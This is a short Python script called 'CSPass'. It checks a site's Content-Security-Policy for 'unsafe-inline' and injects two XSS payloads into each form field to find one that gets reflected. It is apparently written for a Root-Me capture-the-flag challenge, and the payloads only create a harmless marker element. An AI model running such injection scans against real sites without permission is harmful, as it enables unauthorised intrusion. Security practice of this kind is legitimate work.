#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# Author             : Ruulian
# Date created       : None

import argparse
import datetime
import requests
import re
from bs4 import BeautifulSoup as bs
from requests.sessions import session
import time

def date_formatted():
    return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

exploits = {
    'unsafe-inline' : [
        '<script>g=document.createElement("p");g.setAttribute("id", "testing_exploit");</script>',
        '<img src=# onerror="g=document.createElement(\'p\');g.setAttribute(\'id\', \'testing_exploit\');">'
        ]
    }

class Colors:
    # Foreground:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'

    # Formatting
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'    
    
    # End colored text
    END = '\033[0m'
    NC ='\x1b[0m' # No Color

class Scanner:
    def __init__(self, target, no_colors=False):
        self.no_colors = no_colors
        self.target = target
        self.working_payload = ""
        self.print()
        self.print("[<]==============================[>]")
        self.print("[<]    Python CSPass @Ruulian_   [>]")
        self.print("[<]==============================[>]")
        self.print()
        self.sess = requests.session()
        self.is_csp = self.get_csp()
        
    def print(self, message=""):
        if self.no_colors:
            message = re.sub("\x1b[\[]([0-9;]+)m", "", message)
        print(message)

    def get_csp(self):
        r = self.sess.get(self.target)
        headers = r.headers

        if 'Content-Security-Policy' in headers:
            self.csp = headers['Content-Security-Policy']
            return True
        else:
            return False

    def info(self, message=""):
        self.print(f"[{Colors.BLUE}{date_formatted()}{Colors.END}] {message}")

    def error(self, message=""):
        self.print(f"[{Colors.FAIL}ERROR{Colors.END}] {message}")
        self.print()
        exit()

    def exploit(self, vuln):
        r = self.sess.get(self.target)
        soup = bs(r.text, 'html.parser')
        form = soup.find("form")
        if form is not None:
            action = form['action']
            method = form['method']
            inputs = form.find_all("input") + form.find_all("textarea")
            names = [k['name'] for k in inputs]
            current_vuln = exploits[vuln]

            for current_exploit in current_vuln:
                for name in names:
                    if method == "get":
                        testing_exploit = self.sess.get(action, params={name : current_exploit})
                    elif method == "post":
                        testing_exploit = self.sess.post(action, data={name : current_exploit})
                    
                    xss_tested_soup = bs(testing_exploit.text, 'html.parser')
                    result = xss_tested_soup.find("p", attrs={'id':'testing_exploit'})

                    if result is not None:
                        working_payload = current_exploit.replace('document.write(\'<p id="testing_exploit">testing_exploit</p>\');', 'alert()')
                        self.working_payload = working_payload
                        self.print(f"[{Colors.GREEN}SUCCEED{Colors.END}] Payload found: {working_payload}")
                        return
                    time.sleep(0.3)

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='Bypass CSP to perform a XSS')

    parser.add_argument("--no-colors", action="store_true", help="Disable color mode")

    required_args = parser.add_argument_group("Required argument")
    required_args.add_argument("-t", "--target", help="Specify the target url",  required=True)
    
    auth = parser.add_argument_group('Authentication')
    auth.add_argument("-c", "--cookie", help="Specify cookies", required=False)
    auth.add_argument("-u", "--user-agent", help="Specify User-Agent", required=False)
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    vulns = ["unsafe-inline"]
    scan = Scanner("http://challenge01.root-me.org:58008")
    #scan = Scanner("https://0xhorizon.eu")
    scan.info(f"Starting scan on {scan.target}")

    if scan.is_csp:
        scan.info("Content Security Policy found")
    else:
        scan.error("No Content Security Policy")

    for vuln in vulns:
        if vuln in scan.csp:
            scan.print(f"[{Colors.WARNING}VULN{Colors.END}] Potential vulnerability found")
            scan.info("Testing vulnerability ...")
            scan.exploit(vuln)
            if scan.working_payload != "":
                break